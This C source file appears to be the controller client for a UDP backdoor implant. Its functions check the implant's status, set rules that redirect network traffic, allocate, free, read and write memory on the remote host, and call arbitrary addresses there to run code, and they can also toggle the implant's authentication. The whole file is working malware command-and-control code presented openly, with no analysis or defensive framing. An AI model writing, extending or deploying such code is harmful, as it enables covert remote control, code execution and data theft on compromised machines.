#include "control.h"
#include "protocol.h"
#include "commun.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef Linux
#include <unistd.h>
#include <fcntl.h>
#endif // Linux

extern HOST_ADDR gl_Host_Addr;

void clean_stdin()
{
#ifdef Windows
    fflush(stdin);
#endif  //Windows

#ifdef Linux
    int c;
    int fileDesc;

    fileDesc = fcntl(0, F_GETFD);
    fcntl(0, F_SETFL, O_NONBLOCK);
    do
    {
        c = getchar();
    }
    while (c != '\n' && c != EOF);
    fcntl( 0, F_SETFL, fileDesc);
#endif  //Linux
}

int fetch_backdoor_status()
{
    int sendLen = 0;
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;

    memset(&control, 0x00, sizeof(control));

    control.type = CONTROL_FETCH_STATUS;
    sendLen = send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                                         (char *)&control, sizeof(control));
    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_FETCH_STATUS)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }

    printf("[+] The backdoor has been implanted successfully.\nmsg: %s\n", pRepo->msg);
    fflush(stdout);

    return 0;
}

int set_redirect_flow()
{
    CONTROL_CMD control;
    CAP_RULE capRule;
    char buff[1000];
    char portStr[100];
    char *pStr = NULL;
    int idx = 0;
    char choose;
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;

    memset(&capRule, 0x00, sizeof(capRule));
    memset(&control, 0x00, sizeof(control));
    clean_stdin();

    printf("[?] Redirect Transport Protocol: \n1: IP\t2: UDP\n");
    fflush(stdout);
    clean_stdin();
    choose = getchar();
    if(choose == '1')
        capRule.send_proto = USE_IP;
    else
        capRule.send_proto = USE_UDP;
    clean_stdin();

    memset(buff, 0x00, sizeof(buff));
    printf("[?] Redirect to dest IP address: ");
    fflush(stdout);
    scanf("%s", buff);
    if(strchr(buff, 'q') != NULL || strchr(buff, 'Q') != NULL)
    {
        return -1;
    }
    capRule.send_dest_ip = inet_addr(buff);

    if(capRule.send_proto == USE_UDP)
    {
        memset(buff, 0x00, sizeof(buff));
        printf("[?] Redirect to dest port: ");
        fflush(stdout);
        scanf("%s", buff);
        if(strchr(buff, 'q') != NULL || strchr(buff, 'Q') != NULL)
        {
            return -1;
        }
        capRule.send_dest_port = htons((unsigned short)atoi(buff));
    }

    memset(buff, 0x00, sizeof(buff));
    printf("[?] Redirect from src IP address: ");
    fflush(stdout);
    scanf("%s", buff);
    if(strchr(buff, 'q') != NULL || strchr(buff, 'Q') != NULL)
    {
        return -1;
    }
    capRule.send_src_ip = inet_addr(buff);

    if(capRule.send_proto == USE_UDP)
    {
        memset(buff, 0x00, sizeof(buff));
        printf("[?] Redirect from src port: ");
        fflush(stdout);
        scanf("%s", buff);
        if(strchr(buff, 'q') != NULL || strchr(buff, 'Q') != NULL)
        {
            return -1;
        }
        capRule.send_src_port = htons((unsigned short)atoi(buff));
    }

    memset(buff, 0x00, sizeof(buff));
    printf("[?] ACL: ");
    fflush(stdout);
    clean_stdin();
    gets(buff);
    if(strchr(buff, 'q') != NULL || strchr(buff, 'Q') != NULL)
    {
        return -1;
    }

    pStr = strtok(buff, " ");
    if(pStr == NULL)
    {
        puts("[-] Input error.");
        fflush(stdout);
        return -1;
    }

    if(strcmp(pStr, "ip") == 0)
        capRule.proto = CAP_PROTO_IP;
    else if(strcmp(pStr, "tcp") == 0)
        capRule.proto = CAP_PROTO_TCP;
    else if(strcmp(pStr, "udp") == 0)
        capRule.proto = CAP_PROTO_UDP;
    else
    {
        printf("[-] Protocol type error.\n");
        fflush(stdout);
        return -1;
    }
    idx = 1;
    do
    {
        pStr = strtok(NULL, " ");
        idx++;

        if(idx == 2)
            capRule.src_ip = inet_addr(pStr);
        else if(idx == 3)
            capRule.src_mask = inet_addr(pStr);
        else if(idx == 4)
            if(capRule.proto != CAP_PROTO_IP)
                capRule.src_port = htons((unsigned short)atoi(pStr));
            else
                capRule.dest_ip = inet_addr(pStr);
        else if(idx == 5)
            if(capRule.proto != CAP_PROTO_IP)
                capRule.dest_ip = inet_addr(pStr);
            else
            {
                capRule.dest_mask = inet_addr(pStr);
                break;
            }
        else if(idx == 6)
            capRule.dest_mask = inet_addr(pStr);
        else if(idx == 7)
        {
            capRule.dest_port = htons((unsigned short)atoi(pStr));
            break;
        }
    }
    while(pStr != NULL);

    control.type = CONTROL_SET_REDIR_RULE;
    control.capture_rule = capRule;

    struct in_addr addr;
    puts("\n[*] Redirect rule:");
    printf("[*] Protocol: %s\n", capRule.proto == CAP_PROTO_IP ? "IP" : capRule.proto == CAP_PROTO_TCP ? "TCP" : "UDP");
    addr.s_addr = capRule.src_ip;
    printf("[*] Src IP: %s\n", inet_ntoa(addr));
    addr.s_addr = capRule.src_mask;
    printf("[*] Src Mask: %s\n", inet_ntoa(addr));
    memset(portStr, 0x00, sizeof(portStr));
    sprintf(portStr, "%d", ntohs(capRule.src_port));
    printf("[*] Src Port: %s\n", ntohs(capRule.src_port) == 0 ? "any" : portStr);
    addr.s_addr = capRule.dest_ip;
    printf("[*] Dest IP: %s\n", inet_ntoa(addr));
    addr.s_addr = capRule.dest_mask;
    printf("[*] Dest Mask: %s\n", inet_ntoa(addr));
    memset(portStr, 0x00, sizeof(portStr));
    sprintf(portStr, "%d", ntohs(capRule.dest_port));
    printf("[*] Dest Port: %s\n", ntohs(capRule.dest_port) == 0 ? "any" : portStr);
    puts("");
    fflush(stdout);

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));

    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_SET_REDIR_RULE)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }

    if(pRepo->status_code == 0)
    {
        printf("[+] Set a new Rule ID: %d\n", *(int *)pRepo->msg);
        fflush(stdout);
    }
    else
    {
        printf("[+] Set the redirect flow rule failed. Err code: %d.\n", pRepo->status_code);
        fflush(stdout);
    }

    return 0;
}

int alloc_memory()
{
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;

    memset((char *)&control, NULL, sizeof(control));

    control.type = CONTROL_ALLOC_MEM;
    printf("[?] Alloc size (bytes): ");
    fflush(stdout);
    clean_stdin();
    scanf("%d", &control.operate_mem.size);

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));
    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_ALLOC_MEM)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    printf("[+] Alloc new address: 0x");
    fflush(stdout);
    for(idx = sizeof(int) - 1; idx >= 0; idx--)
        printf("%02x", ((unsigned char *)&pRepo->status_code)[idx]);
    puts("");
    fflush(stdout);

    return 0;
}

static void str_to_hex(unsigned char *pDest, unsigned char *pSrc, int nLen)
{
    char h1,h2;
    char swap;
    unsigned char s1,s2;
    int i;

    for (i = 0; i < nLen; i++)
    {
        h1 = pSrc[2*i];
        h2 = pSrc[2*i+1];

        s1 = toupper(h1) - 0x30;
        if (s1 > 9)
            s1 -= 7;

        s2 = toupper(h2) - 0x30;
        if (s2 > 9)
            s2 -= 7;

        pDest[i] = s1*16 + s2;
    }

    for(i = 0; i < nLen / 2; i++)
    {
        swap = pDest[i];
        pDest[i] = pDest[nLen - i - 1];
        pDest[nLen - i - 1] = swap;
    }

    return;
}

static int conv_byte_order_with_int(int n)
{
    char swap;
    int i;
    int nLen = sizeof(int);
    unsigned char *pDest = (unsigned char *)&n;

    for(i = 0; i < nLen / 2; i++)
    {
        swap = pDest[i];
        pDest[i] = pDest[nLen - i - 1];
        pDest[nLen - i - 1] = swap;
    }

    return n;
}

int free_memory()
{
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    char hexStr[20];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;

    memset((char *)&control, NULL, sizeof(control));
    memset(hexStr, NULL, sizeof(hexStr));

    control.type = CONTROL_FREE_MEM;
    printf("[?] Free address: 0x");
    fflush(stdout);
    clean_stdin();
    scanf("%s", hexStr);
    str_to_hex((unsigned char *)&control.operate_mem.address, hexStr, sizeof(int *));

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));
    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_FREE_MEM)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }

    printf("[+] Freed memory success.\n");
    fflush(stdout);

    return 0;
}

int call_address()
{
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    char hexStr[20];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;

    memset((char *)&control, NULL, sizeof(control));
    memset(hexStr, NULL, sizeof(hexStr));

    control.type = CONTROL_CALL_ADDR;
    printf("[?] Call by address: 0x");
    fflush(stdout);
    clean_stdin();
    scanf("%s", hexStr);
    str_to_hex((unsigned char *)&control.operate_mem.address, hexStr, sizeof(int *));

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));

    return 0;
}

int write_to_memory()
{
    int recvLen = 0;
    int readLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    char readBuff[500];
    char hexStr[20];
    char binFilePath[255];
    char sendBuff[PKT_BUFF_SIZE];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;
    unsigned int wrAddrInMem = 0;
    FILE *binFile = NULL;
    int wrTotalSize = 0;

    memset((char *)&control, NULL, sizeof(control));
    memset(hexStr, NULL, sizeof(hexStr));
    memset(binFilePath, NULL, sizeof(binFilePath));

    printf("[?] Write to address: 0x");
    fflush(stdout);
    clean_stdin();
    scanf("%s", hexStr);
    str_to_hex((unsigned char *)&wrAddrInMem, hexStr, sizeof(int *));

    printf("[?] Local binary file path: ");
    fflush(stdout);
    clean_stdin();
    gets(binFilePath);

    binFile = fopen(binFilePath, "rb");
    if(binFile == NULL)
    {
        printf("[-] Can't open binary file.\n");
        fflush(stdout);
        return -1;
    }

    while(1)
    {
        memset(readBuff, NULL, sizeof(readBuff));
        memset(sendBuff, NULL, sizeof(sendBuff));

        readLen = fread(readBuff, sizeof(char), sizeof(readBuff), binFile);
        if(readLen <= 0)
        {
            printf("[-] Read file failed.\n");
            fflush(stdout);
            break;
        }

        control.type = CONTROL_WR_MEM;
        control.operate_mem.address = (int)wrAddrInMem;
        control.operate_mem.payload_len = readLen;
        wrAddrInMem += readLen;

        memcpy(sendBuff, &control, sizeof(control));
        memcpy(sendBuff + sizeof(control), readBuff, readLen);

        send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                   gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                                   sendBuff, sizeof(control) + readLen);

        recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                             recvBuff, sizeof(recvBuff));

        if(recvLen <= 0)
        {
            printf("[-] Recv failed.\n");
            fflush(stdout);
            break;
        }
        pProtoHdr = (PROTO_HDR *)recvBuff;
        if(pProtoHdr->type != PROTO_REPO_STAT)
        {
            printf("[-] Protocol type mismatch.\n");
            fflush(stdout);
            break;
        }
        pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
        if(pRepo->type != CONTROL_WR_MEM)
        {
            printf("[-] Protocol type mismatch.\n");
            fflush(stdout);
            break;
        }

        if(pRepo->status_code != 0)
        {
            printf("[-] Write to memory failed. Err code: %d.\n", pRepo->status_code);
            fflush(stdout);
            break;
        }

        wrTotalSize += readLen;

        if(feof(binFile))
        {
            printf("[+] Successfully writes %d bytes to memory on address 0x", wrTotalSize);
            wrAddrInMem -= wrTotalSize;
            for(idx = sizeof(int) - 1; idx >= 0; idx--)
                printf("%02x", ((unsigned char *)&wrAddrInMem)[idx]);
            puts(".");
            fflush(stdout);
            break;
        }
    }
    fclose(binFile);

    return 0;
}

int read_from_memory()
{
    int recvLen = 0;
    int writeLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    char hexStr[20];
    char binFilePath[255];
    int idx = 0;
    unsigned int rdAddrInMem = 0;
    FILE *binFile = NULL;
    char *pRecomBuff = NULL;
    int rdSize = 0;
    CONTROL_CMD control;
    OPER_MEM_HDR *pOperMemHdr = NULL;
    char *pBinStream = NULL;

    memset((char *)&control, NULL, sizeof(control));
    memset(hexStr, NULL, sizeof(hexStr));
    memset(binFilePath, NULL, sizeof(binFilePath));

    printf("[?] Read from address: 0x");
    fflush(stdout);
    clean_stdin();
    scanf("%s", hexStr);
    str_to_hex((unsigned char *)&rdAddrInMem, hexStr, sizeof(int *));

    printf("[?] Read size (bytes): ");
    fflush(stdout);
    clean_stdin();
    scanf("%d", &rdSize);

    printf("[?] Output binary file path: ");
    fflush(stdout);
    clean_stdin();
    gets(binFilePath);

    binFile = fopen(binFilePath, "wb");
    if(binFile == NULL)
    {
        printf("[-] Can't create binary file.\n");
        fflush(stdout);
        return -1;
    }

    control.type = CONTROL_RD_MEM;
    control.operate_mem.address = (int)rdAddrInMem;
    control.operate_mem.size = rdSize;

    pRecomBuff = (char *)malloc(rdSize + sizeof(OPER_MEM_HDR));
    if(pRecomBuff == NULL)
    {
        puts("[-] malloc error.");
        return -1;
    }
    memset(pRecomBuff, NULL, rdSize);

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));
    recvLen = recv_frag_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
              pRecomBuff);
    if(recvLen <= 0)
    {
        return -1;
    }

    pOperMemHdr = (OPER_MEM_HDR *)pRecomBuff;
    pBinStream = pRecomBuff + sizeof(OPER_MEM_HDR);
    fwrite(pBinStream, sizeof(char), pOperMemHdr->payload_len, binFile);
    fclose(binFile);

    printf("[+] Successfully reads %d bytes from memory on address 0x", rdSize);
    for(idx = sizeof(int) - 1; idx >= 0; idx--)
        printf("%02x", ((unsigned char *)&rdAddrInMem)[idx]);
    puts(".");
    fflush(stdout);

    return 0;
}

int enable_auth()
{
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;

    memset((char *)&control, NULL, sizeof(control));

    control.type = CONTROL_EN_AUTH;

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));
    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_EN_AUTH)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }

    if(pRepo->status_code == 0)
    {
        printf("[+] Enable identity authentication success.\n");
        fflush(stdout);
    }
    else
    {
        printf("[-] Enable identity authentication failed. Err code: %d.\n", pRepo->status_code);
        fflush(stdout);
    }

    return 0;
}

int disable_auth()
{
    int recvLen = 0;
    char recvBuff[PKT_BUFF_SIZE];
    CONTROL_CMD control;
    PROTO_HDR *pProtoHdr = NULL;
    REPO_STAT *pRepo = NULL;
    int idx = 0;

    memset((char *)&control, NULL, sizeof(control));

    control.type = CONTROL_DIS_AUTH;

    send_control_proto_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                               gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port, \
                               (char *)&control, sizeof(control));
    recvLen = recv_from_backdoor_via_udp(gl_Host_Addr.soc, gl_Host_Addr.dest_addr, \
                                         recvBuff, sizeof(recvBuff));

    if(recvLen <= 0)
    {
        printf("[-] Recv failed.\n");
        fflush(stdout);
        return -1;
    }
    pProtoHdr = (PROTO_HDR *)recvBuff;
    if(pProtoHdr->type != PROTO_REPO_STAT)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }
    pRepo = (REPO_STAT *)(recvBuff + sizeof(PROTO_HDR));
    if(pRepo->type != CONTROL_DIS_AUTH)
    {
        printf("[-] Protocol type mismatch.\n");
        fflush(stdout);
        return -1;
    }

    if(pRepo->status_code == 0)
    {
        printf("[+] Disable identity authentication success.\n");
    }
    else
    {
        printf("[-] Disable identity authentication failed. Err code: %d.\n", pRepo->status_code);
    }
    fflush(stdout);

    return 0;
}







